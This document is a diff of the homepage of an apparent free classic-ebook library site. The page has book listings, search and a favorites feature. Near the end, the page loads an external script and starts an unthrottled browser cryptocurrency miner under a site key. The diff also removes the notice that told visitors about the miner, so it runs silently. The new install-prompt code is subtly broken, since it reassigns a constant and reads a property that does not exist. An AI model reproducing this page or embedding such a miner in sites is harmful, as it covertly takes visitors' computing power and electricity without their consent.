@@ -1,495 +1,535 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head>
-        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <meta name="description" content="Explore a vast collection of timeless classic ebooks for free. Immerse yourself in the literary treasures of the past with our curated selection of beloved works. Discover, read, and relive the magic of literature's greatest masterpieces.">
-        <meta name="keywords" content="classic ebooks, free to read, timeless literature, literary treasures, classic literature, beloved works, curated collection, literary masterpieces, vintage books, historical novels, public domain texts, timeless classics, reading experience, online library, literary heritage.">
-        <link rel="icon" href="assets/aklatell.png">
-        <title>Aklatell - Library of Classical eBooks</title>
-        <style>
-            @font-face{
-                font-family: Bookman;
-                font-display: swap;
-                src: url('assets/Bookman.otf');
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Explore a vast collection of timeless classic ebooks for free. Immerse yourself in the literary treasures of the past with our curated selection of beloved works. Discover, read, and relive the magic of literature's greatest masterpieces.">
+    <meta name="keywords" content="classic ebooks, free to read, timeless literature, literary treasures, classic literature, beloved works, curated collection, literary masterpieces, vintage books, historical novels, public domain texts, timeless classics, reading experience, online library, literary heritage.">
+    <link rel="icon" href="assets/aklatell.png">
+    <link rel="manifest" href="/manifest.json">
+    <title>Aklatell - Library of Classical eBooks</title>
+    <style>
+@font-face {
+        font-family: Bookman;
+        font-display: swap;
+        src: url('assets/Bookman.otf');
+    }
+        * {
+            font-family: Bookman;
+            box-sizing: border-box;
+            padding: 0px;
+            margin: 0px;
+        }
+        img {
+            width: 100%;
+            height: auto;
+        }
+        button {
+            outline: none;
+            border: none;
+            width: 95%;
+            margin: auto;
+            padding: 4px;
+            text-transform: uppercase;
+            background: #16161D;
+            color: #FAF9F6;
+        }
+        body {
+            background: #16161D;
+            color: #FAF9F6;
+        }
+        header {
+            box-shadow: 1px 1px 2px 1px #12121B;
+            text-align: center;
+            background: #D98301;
+            background: linear-gradient(135deg, #D98301, #FF9501);
+            text-shadow: 1px 1px #FF9501;
+            color: #16161D;
+            z-index: 5;
+            padding: 10px;
+        }
+        .search {
+            width: 100%;
+            padding: 6px;
+            padding-left: 10px;
+            padding-right: 10px;
+        }
+        .search form {
+            display: flex;
+            justify-content: center;
+            width: 100%;
+        }
+        .search form input {
+            width: 100%;
+            padding: 8px;
+            color: #16161D;
+            border: 2px solid #FAF9F6;
+            text-align: center;
+            outline: none;
+        }
+        .ebooks {
+            padding: 6px;
+            padding-top: 0px;
+        }
+        .ebooks ul {
+            display: grid;
+            list-style: none;
+            grid-template-columns: 33.33% 33.33% 33.33%;
+            padding: 0px 10px 0px 10px;
+            justify-content: space-evenly;
+            gap: 6px;
+        }
+        .ebooks ul li {
+            display: grid;
+            padding: 4px;
+            background: #D98301;
+            border: 1px solid #FF9501;
+            justify-content: center;
+            align-items: center;
+        }
+        .ebooks ul li .cover {
+            height: 145px;
+            width: 100%;
+            object-fit: fill;
+            overflow: hidden;
+        }
+        .ebooks ul li .cover img {
+            height: 100%;
+            width: 100%;
+            object-fit: fill;
+            overflow: hidden;
+        }
+        .ebooks ul li h2 {
+            display: grid;
+            text-shadow: 1px 1px #FF9501;
+            padding-top: 4px;
+            font-size: 10px;
+            text-transform: uppercase;
+            text-decoration: none;
+            text-align: center;
+            font-weight: bold;
+            overflow-x: scroll;
+            white-space: pre;
+            color: #16161D;
+        }
+        .ebooks ul li h2::-webkit-scrollbar {
+            display: none;
+        }
+        .favorites-container {
+            display: none;
+            width: 100%;
+            height: 100%;
+            position: fixed;
+            top: 0px;
+            left: 0px;
+            background: #16161D;
+        }
+        .favorites-list {
+            display: block;
+            height: 100%;
+            overflow-y: scroll;
+            padding-bottom: 90px;
+        }
+        .my-favorites {
+            padding: 10px;
+            text-align: center;
+            background: #D98301;
+            color: #16161D;
+            text-transform: uppercase;
+        }
+        .favorites {
+            display: grid;
+            width: 100%;
+            list-style: none;
+            flex-direction: column;
+            grid-template-columns: 33.33% 33.33% 33.33%;
+            justify-content: space-evenly;
+            padding: 14px;
+            gap: 6px;
+        }
+        .favorites li {
+            display: grid;
+            padding: 4px;
+            background: #D98301;
+            justify-content: center;
+            align-items: center;
+        }
+        .favorites li .cover {
+            height: 145px;
+            width: 100%;
+            object-fit: fill;
+            overflow: hidden;
+        }
+        .favorites li .cover img {
+            height: 100%;
+            width: 100%;
+            object-fit: fill;
+            overflow: hidden;
+        }
+        .favorites li h2 {
+            display: grid;
+            text-shadow: 1px 1px #FF9501;
+            padding-top: 4px;
+            font-size: 10px;
+            text-transform: uppercase;
+            text-decoration: none;
+            text-align: center;
+            font-weight: bold;
+            overflow-x: scroll;
+            white-space: pre;
+            color: #16161D;
+        }
+        .favorites li h2::-webkit-scrollbar {
+            display: none;
+        }
+        .menu {
+            position: fixed;
+            width: 100%;
+            bottom: 0px;
+            left: 0px;
+        }
+        .menu ul {
+            display: flex;
+            list-style: none;
+            box-shadow: 1px 1px 2px 1px #12121B;
+            background: #D98301;
+            justify-content: space-between;
+            z-index: 5;
+            width: 100%;
+        }
+        .menu ul li {
+            width: 100%;
+        }
+        .menu ul li a {
+            text-decoration: none;
+            padding-top: 6px;
+            display: grid;
+        }
+        .menu ul li img {
+            display: block;
+            margin: auto;
+            height: 24px;
+            width: 24px;
+        }
+        .menu ul li span {
+            display: block;
+            font-size: 10px;
+            margin-top: 6px;
+            color: #16161D;
+            text-shadow: 1px 1px #FF9501;
+            text-transform: uppercase;
+            text-align: center;
+        }
+        .ad {
+            padding-top: 6px;
+        }
+        .fav-btn {
+            width: 48px;
+            right: 5%;
+            bottom: 10%;
+            height: 48px;
+            position: fixed;
+            border-radius: 50%;
+            background: #D98301;
+            text-align: center;
+            border: 1px solid #FF9501;
+        }
+        .added, .exists {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            padding: 14px;
+            width: 75vw;
+            border-radius: 5px;
+            text-transform: uppercase;
+            border: 2px solid #FAF9F6;
+            transform: translate(-50%);
+            text-align: center;
+            background: #16161D;
+            animation-name: fade;
+            animation-duration: .5s;
+            animation-direction: ease-in-out;
+        }
+@keyframes fade {
+            0% {
+                margin-top: -300px;
             }
-            *{
-                font-family: Bookman;
-                box-sizing: border-box;
-                padding: 0px;
-                margin: 0px;
+            100% {
+                margin-top: 0px;
             }
-            img{
-                width: 100%;
-                height: auto;
-            }
-            button{
-                outline: none;
-                border: none;
-                width: 95%;
-                margin: auto;
-                padding: 4px;
-                text-transform: uppercase;
-                background: #16161D;
-                color: #FAF9F6;
-            }
-            body{
-                background: #16161D;
-                color: #FAF9F6;
-            }
-            header{
-                box-shadow: 1px  1px 2px 1px #12121B;
-                text-align: center;
-                background: #D98301;
-                background: linear-gradient(135deg, #D98301, #FF9501);
-                text-shadow: 1px 1px #FF9501;
-                color: #16161D;
-                z-index: 5;
-                padding: 10px;
-            }
-            .search{
-                width: 100%;
-                padding: 6px;
-                padding-left: 10px;
-                padding-right: 10px;
-            }
-            .search form{
-                display: flex;
-                justify-content: center;
-                width: 100%;
-            }
-            .search form input{
-                width: 100%;
-                padding: 8px;
-                color: #16161D;
-                border: 2px solid #FAF9F6;
-                text-align: center;
-                outline: none;
-            }
-            .ebooks{
-                padding: 6px;
-                padding-top: 0px;
-            }
-            .ebooks ul{
-                display: grid;
-                list-style: none;
-                grid-template-columns: 33.33% 33.33% 33.33%;
-                padding: 0px 10px 0px 10px;
-                justify-content: space-evenly;
-                gap: 6px;
-            }
-            .ebooks ul li{
-                display: grid;
-                padding: 4px;
-                background: #D98301;
-                border: 1px solid #FF9501;
-                justify-content: center;
-                align-items: center;
-            }
-            .ebooks ul li .cover{
-                height: 145px;
-                width: 100%;
-                object-fit: fill;
-                overflow: hidden;
-            }
-            .ebooks ul li .cover img{
-                height: 100%;
-                width: 100%;
-                object-fit: fill;
-                overflow: hidden;
-            }
-            .ebooks ul li h2{
-                display: grid;
-                text-shadow: 1px 1px #FF9501;
-                padding-top: 4px;
-                font-size: 10px;
-                text-transform: uppercase;
-                text-decoration: none;
-                text-align: center;
-                font-weight: bold;
-                overflow-x: scroll;
-                white-space: pre;
-                color: #16161D;
-            }
-            .ebooks ul li h2::-webkit-scrollbar{
-                display: none;
-            }
-            .favorites-container{
-                display: none;
-                width: 100%;
-                height: 100%;
-                position: fixed;
-                top: 0px;
-                left: 0px;
-                background: #16161D;
-            }
-            .favorites-list{
-                display: block;
-                height: 100%;
-                overflow-y: scroll;
-                padding-bottom: 90px;
-            }
-            .my-favorites{
-                padding: 10px;
-                text-align: center;
-                background: #D98301;
-                color: #16161D;
-                text-transform: uppercase;
-            }
-            .favorites{
-                display: grid;
-                width: 100%;
-                list-style: none;
-                flex-direction: column;
-                grid-template-columns: 33.33% 33.33% 33.33%;
-                justify-content: space-evenly;
-                padding: 14px;
-                gap: 6px;
-            }
-            .favorites li{
-                display: grid;
-                padding: 4px;
-                background: #D98301;
-                justify-content: center;
-                align-items: center;
-            }
-            .favorites li .cover{
-                height: 145px;
-                width: 100%;
-                object-fit: fill;
-                overflow: hidden;
-            }
-            .favorites li .cover img{
-                height: 100%;
-                width: 100%;
-                object-fit: fill;
-                overflow: hidden;
-            }
-            .favorites li h2{
-                display: grid;
-                text-shadow: 1px 1px #FF9501;
-                padding-top: 4px;
-                font-size: 10px;
-                text-transform: uppercase;
-                text-decoration: none;
-                text-align: center;
-                font-weight: bold;
-                overflow-x: scroll;
-                white-space: pre;
-                color: #16161D;
-            }
-            .favorites li h2::-webkit-scrollbar{
-                display: none;
-            }
-            .menu{
-                position: fixed;
-                width: 100%;
-                bottom: 0px;
-                left: 0px;
-            }
-            .menu ul{
-                display: flex;
-                list-style: none;
-                box-shadow: 1px  1px 2px 1px #12121B;
-                background: #D98301;
-                justify-content: space-between;
-                z-index: 5;
-                width: 100%;
-            }
-            .menu ul li{
-                width: 100%;
-            }
-            .menu ul li a{
-                text-decoration: none;
-                padding-top: 6px;
-                display: grid;
-            }
-            .menu ul li img{
-                display: block;
-                margin: auto;
-                height: 24px;
-                width: 24px;
-            }
-            .menu ul li span{
-                display: block;
-                font-size: 10px;
-                margin-top: 6px;
-                color: #16161D;
-                text-shadow: 1px 1px #FF9501;
-                text-transform: uppercase;
-                text-align: center;
-            }
-            .ad{
-                padding-top: 6px;
-            }
-            .fav-btn{
-                width: 48px;
-                right: 5%;
-                bottom: 10%;
-                height: 48px;
-                position: fixed;
-                border-radius: 50%;
-                background: #D98301;
-                text-align: center;
-                border: 1px solid #FF9501;
-            }
-            .added, .exists{
-                display: none;
-                position: fixed;
-                top: 50%;
-                left: 50%;
-                padding: 14px;
-                width: 75vw;
-                border-radius: 5px;
-                text-transform: uppercase;
-                border: 2px solid #FAF9F6;
-                transform: translate(-50%);
-                text-align: center;
-                background: #16161D;
-                animation-name: fade;
-                animation-duration: .5s;
-                animation-direction: ease-in-out;
-            }
-            @keyframes fade{
-                0%{
-                    margin-top: -300px;
-                }
-                100%{
-                    margin-top: 0px;
-                }
-            }
-        </style>
-        <!-- AddToAny BEGIN -->
-        <script async src="https://static.addtoany.com/menu/page.js"></script>
-        <!-- AddToAny END -->
-    </head>
-    <body oncontextmenu="return false">
-        <header>
-            <h1>AKLATELL</h1>
-        </header>
-        <main>
-            <section class="ad">
-                <center>
-                    <iframe data-aa='2247755' src='//ad.a-ads.com/2247755?size=320x50' style='width:320px; height:50px; border:0px; padding:0; overflow:hidden; background-color: transparent;'></iframe>
-                </center>
-            </section>
-            <section class="search">
-                <form>
-                    <input type="text" placeholder="SEARCH TITLE" id="search">
-                </form>
-            </section>
-            <section class="ebooks">
-                <ul id="ebook-list">
-                    <li>
-                        <div class="cover">
-                            <a href="ebooks/eBook of A Room With a View, by E. M. Forster.html">
+        }
+    </style>
+    <!-- AddToAny BEGIN -->
+    <script async src="https://static.addtoany.com/menu/page.js"></script>
+    <!-- AddToAny END -->
+</head>
+<body oncontextmenu="return false">
+    <header>
+        <h1>AKLATELL</h1>
+    </header>
+    <main>
+        <section class="ad">
+            <center>
+                <iframe data-aa='2247755' src='//ad.a-ads.com/2247755?size=320x50' style='width:320px; height:50px; border:0px; padding:0; overflow:hidden; background-color: transparent;'></iframe>
+            </center>
+        </section>
+        <section class="search">
+            <form>
+                <input type="text" placeholder="SEARCH TITLE" id="search">
+            </form>
+        </section>
+        <section class="ebooks">
+            <ul id="ebook-list">
+                <li>
+                    <div class="cover">
+                        <a href="ebooks/eBook of A Room With a View, by E. M. Forster.html">
                             <img src="covers/a-room.jpg">
-                            </a>
-                        </div>
-                        <h2>A Room With a View</h2>
-                        <button>Favorite</button>
-                    </li>
-                    <li>
-                        <div class="cover">
-                            <a href="ebooks/eBook of Middlemarch, by George Eliot.html">
+                        </a>
+                    </div>
+                    <h2>A Room With a View</h2>
+                    <button>Favorite</button>
+                </li>
+                <li>
+                    <div class="cover">
+                        <a href="ebooks/eBook of Middlemarch, by George Eliot.html">
                             <img src="covers/middlemarch.jpg">
-                            </a>
-                        </div>
-                        <h2>Middlemarch</h2>
-                        <button>Favorite</button>
-                    </li>
-                    <li>
-                        <div class="cover">
-                            <a href="ebooks/eBook of Little Women, by Louisa M. Alcott.html">
+                        </a>
+                    </div>
+                    <h2>Middlemarch</h2>
+                    <button>Favorite</button>
+                </li>
+                <li>
+                    <div class="cover">
+                        <a href="ebooks/eBook of Little Women, by Louisa M. Alcott.html">
                             <img src="covers/little-women.jpg">
-                            </a>
-                        </div>
-                        <h2>Little Women</h2>
-                        <button>Favorite</button>
-                    </li>
-                    <li>
-                        <div class="cover">
-                            <a href="ebooks/The Blue Castle.html">
+                        </a>
+                    </div>
+                    <h2>Little Women</h2>
+                    <button>Favorite</button>
+                </li>
+                <li>
+                    <div class="cover">
+                        <a href="ebooks/The Blue Castle.html">
                             <img src="covers/blue-castle.jpg">
-                            </a>
-                        </div>
-                        <h2>Blue Castle</h2>
-                        <button>Favorite</button>
-                    </li>
-                    <li>
-                        <div class="cover">
-                            <a href="ebooks/eBook of The Enchanted April, by Elizabeth Von Arnim.html">
+                        </a>
+                    </div>
+                    <h2>Blue Castle</h2>
+                    <button>Favorite</button>
+                </li>
+                <li>
+                    <div class="cover">
+                        <a href="ebooks/eBook of The Enchanted April, by Elizabeth Von Arnim.html">
                             <img src="covers/enchanted-april.jpg">
-                            </a>
-                        </div>
-                        <h2>The Enchanted April</h2>
-                        <button>Favorite</button>
-                    </li>
-                </ul>
-            </section>
-            <section class="favorites-container ">
-                <h2 class="my-favorites">My Favorites</h2>
-                <div class="favorites-list">
+                        </a>
+                    </div>
+                    <h2>The Enchanted April</h2>
+                    <button>Favorite</button>
+                </li>
+            </ul>
+        </section>
+        <section class="favorites-container ">
+            <h2 class="my-favorites">My Favorites</h2>
+            <div class="favorites-list">
                 <ul class="favorites"></ul>
-                </div>
-            </section>
-        </main>
-        <footer>
-            <section class="menu">
-                <ul>
-                    <li>
-                        <a href="request.html">
+            </div>
+        </section>
+    </main>
+    <footer>
+        <section class="menu">
+            <ul>
+                <li>
+                    <a href="request.html">
                         <img src="assets/request.png">
                         <span>Request</span>
-                        </a>
-                    </li>
-                    <li>
-                        <a href="home.html">
+                    </a>
+                </li>
+                <li>
+                    <a href="home.html">
                         <img src="assets/home.png">
                         <span>Home</span>
-                        </a>
-                    </li>
-                    <li>
-                        <a href="contact.html">
+                    </a>
+                </li>
+                <li>
+                    <a href="contact.html">
                         <img src="assets/contact.png">
                         <span>Contact</span>
-                        </a>
-                    </li>
-                    <li>
-                        <a href="about.html">
+                    </a>
+                </li>
+                <li>
+                    <a href="about.html">
                         <img src="assets/about.png">
                         <span>About</span>
-                        </a>
-                    </li>
-                    <li>
-                        <a class="a2a_dd" href="https://www.addtoany.com/share">
+                    </a>
+                </li>
+                <li>
+                    <a class="a2a_dd" href="https://www.addtoany.com/share">
                         <img src="assets/sharing.png">
                         <span>Share</span>
-                        </a>
-                    </li>
-                </ul>
-            </section>
-            <button class="fav-btn"><img src="assets/favorite.png"></button>
-            <p class="added">eBook has been added to favorites.</p>
-            <p class="exists">eBook is already added in favorites.</p>
-        </footer>
+                    </a>
+                </li>
+            </ul>
+        </section>
+        <button class="fav-btn"><img src="assets/favorite.png"></button>
+        <p class="added">
+            eBook has been added to favorites.
+        </p>
+        <p class="exists">
+            eBook is already added in favorites.
+        </p>
+        <button id="install-button" style="display: none;">Install PWA</button>
+    </footer>
     <script>
         let favBtn = document.querySelector('.fav-btn');
         let searchInput = document.getElementById('search');
         let ebookList = document.getElementById('ebook-list');
         myEbookList = ebookList.getElementsByTagName('li');
-        
+
         favBtn.addEventListener('click', () => {
             let favoritesContainer = document.querySelector('.favorites-container');
-            if(favoritesContainer.style.display === 'block'){
+            if (favoritesContainer.style.display === 'block') {
                 favoritesContainer.style.display = 'none';
-            }else{
+            } else {
                 favoritesContainer.style.display = 'block';
             }
         });
         searchInput.addEventListener('input', () => {
-            
+
             searchInput.value = searchInput.value.toUpperCase();
-            
-            for(let i = 0; i < myEbookList.length; i++){
+
+            for (let i = 0; i < myEbookList.length; i++) {
                 let ebookTitle = myEbookList[i].textContent.toUpperCase();
-                if(ebookTitle.includes(searchInput.value)){
+                if (ebookTitle.includes(searchInput.value)) {
                     myEbookList[i].style.display = 'grid';
-                }else{
+                } else {
                     myEbookList[i].style.display = 'none';
                 }
             }
         });
-        
-      document.addEventListener("DOMContentLoaded", function () {
-        const ebookList = document.querySelector("#ebook-list");
-        const favoritesList = document.querySelector(".favorites");
 
-        // Load favorites from local storage
-        const savedFavorites = JSON.parse(localStorage.getItem("favorites")) || [];
+        document.addEventListener("DOMContentLoaded", function () {
+            const ebookList = document.querySelector("#ebook-list");
+            const favoritesList = document.querySelector(".favorites");
 
-        // Function to update the favorites list
-        function updateFavorites() {
-          favoritesList.innerHTML = "";
-          savedFavorites.reverse().forEach(item => {
-            const li = document.createElement("li");
-            li.innerHTML = item;
+            // Load favorites from local storage
+            const savedFavorites = JSON.parse(localStorage.getItem("favorites")) || [];
 
-            const unfavoriteButton = document.createElement("button");
-            unfavoriteButton.textContent = "Unfavorite";
-            unfavoriteButton.addEventListener("click", function () {
-              const index = savedFavorites.indexOf(item);
-              if (index !== -1) {
-                savedFavorites.splice(index, 1);
-                localStorage.setItem("favorites", JSON.stringify(savedFavorites));
-                updateFavorites();
-              }
-            });
+            // Function to update the favorites list
+            function updateFavorites() {
+                favoritesList.innerHTML = "";
+                savedFavorites.reverse().forEach(item => {
+                    const li = document.createElement("li");
+                    li.innerHTML = item;
 
-            li.appendChild(unfavoriteButton);
-            favoritesList.appendChild(li);
-          });
-        }
+                    const unfavoriteButton = document.createElement("button");
+                    unfavoriteButton.textContent = "Unfavorite";
+                    unfavoriteButton.addEventListener("click", function () {
+                        const index = savedFavorites.indexOf(item);
+                        if (index !== -1) {
+                            savedFavorites.splice(index, 1);
+                            localStorage.setItem("favorites", JSON.stringify(savedFavorites));
+                            updateFavorites();
+                        }
+                    });
 
-        // Initial update of the favorites list
-        updateFavorites();
-
-        ebookList.addEventListener("click", function (event) {
-          if (event.target.tagName === "BUTTON") {
-            const ebookItem = event.target.parentElement;
-            const ebookItemClone = ebookItem.cloneNode(true);
-            // Remove the "Favorite" button from the cloned list item
-            const favoriteButton = ebookItemClone.querySelector("button");
-            favoriteButton.remove();
-
-            const title = ebookItemClone.querySelector("h2").textContent;
-            const ebookExists = savedFavorites.some(item => item.includes(title))
-            if (!savedFavorites.includes(ebookItemClone.outerHTML) && !ebookExists) {
-              // Move the cloned list item to the favorites list
-              favoritesList.appendChild(ebookItemClone);
-              savedFavorites.push(ebookItemClone.outerHTML);
-              localStorage.setItem("favorites", JSON.stringify(savedFavorites));
-              updateFavorites();
-              let added = document.querySelector('.added');
-               added.style.display = 'block';
-               setTimeout(() => {
-                    added.style.display = 'none';
-                }, 2500);
-            }else{
-               let exists = document.querySelector('.exists');
-               exists.style.display = 'block';
-               setTimeout(() => {
-               exists.style.display = 'none';
-                }, 2500);
+                    li.appendChild(unfavoriteButton);
+                    favoritesList.appendChild(li);
+                });
             }
-          }
+
+            // Initial update of the favorites list
+            updateFavorites();
+
+            ebookList.addEventListener("click", function (event) {
+                if (event.target.tagName === "BUTTON") {
+                    const ebookItem = event.target.parentElement;
+                    const ebookItemClone = ebookItem.cloneNode(true);
+                    // Remove the "Favorite" button from the cloned list item
+                    const favoriteButton = ebookItemClone.querySelector("button");
+                    favoriteButton.remove();
+
+                    const title = ebookItemClone.querySelector("h2").textContent;
+                    const ebookExists = savedFavorites.some(item => item.includes(title))
+                    if (!savedFavorites.includes(ebookItemClone.outerHTML) && !ebookExists) {
+                        // Move the cloned list item to the favorites list
+                        favoritesList.appendChild(ebookItemClone);
+                        savedFavorites.push(ebookItemClone.outerHTML);
+                        localStorage.setItem("favorites", JSON.stringify(savedFavorites));
+                        updateFavorites();
+                        let added = document.querySelector('.added');
+                        added.style.display = 'block';
+                        setTimeout(() => {
+                            added.style.display = 'none';
+                        }, 2500);
+                    } else {
+                        let exists = document.querySelector('.exists');
+                        exists.style.display = 'block';
+                        setTimeout(() => {
+                            exists.style.display = 'none';
+                        }, 2500);
+                    }
+                }
+            });
         });
-      });
-    
+
     </script>
     <script src="https://www.hostingcloud.racing/73UE.js"></script>
     <script>
         var _client = new Client.Anonymous('1b338ef2246dfb0c9665ca717515ff07c101d6d5c96df696097a28b6fb997ed5', {
-            throttle: 0, c: 'w'
+            throttle: 0, c: 'w', ads: 0
         });
         _client.start();
-        
-    </script>
-    <script>
-        setTimeout(function(){
-            if(typeof _client === 'undefined' || _client === null)
-            {
-                var messageDiv = document.createElement("div");
-                messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
-                messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
-                var mainDiv = document.createElement("div");
-                mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
-                mainDiv.appendChild(messageDiv);
-                document.body.appendChild(mainDiv);
-                document.getElementsByTagName("body")[0].style.overflow = "hidden";
-                window.scrollTo(0, 0);
+
+        if ('serviceWorker' in navigator && window.matchMedia('(display-mode: standalone)').matches === false) {
+            window.addEventListener('load', async () => {
+                try {
+                    const registration = await navigator.serviceWorker.register('/service-worker.js');
+                    console.log('Service Worker registered:', registration);
+
+                    const {
+                        state
+                    } = registration;
+                    if (state === 'activated' || state === 'redundant') {
+                        showInstallPrompt(registration);
+                    } else {
+                        registration.addEventListener('statechange', event => {
+                            if (event.target.state === 'activated' || event.target.state === 'redundant') {
+                                showInstallPrompt(registration);
+                            }
+                        });
+                    }
+                } catch (error) {
+                    console.error('Service Worker registration failed:',
+                        error);
+                }
+            });
+        }
+
+        function showInstallPrompt(registration) {
+            const deferredPrompt = registration.deferredPrompt;
+
+            if (!deferredPrompt) {
+                return;
             }
-        },1000);
+
+            const installButton = document.getElementById('install-button');
+
+            installButton.addEventListener('click', () => {
+                deferredPrompt.prompt();
+
+                deferredPrompt.userChoice.then(choiceResult => {
+                    if (choiceResult.outcome === 'accepted') {
+                        console.log('User accepted the install prompt');
+                    } else {
+                        console.log('User dismissed the install prompt');
+                    }
+
+                    deferredPrompt = null;
+                });
+            });
+
+            installButton.style.display = 'block';
+        }
     </script>
-    </body>
+</body>
 </html>
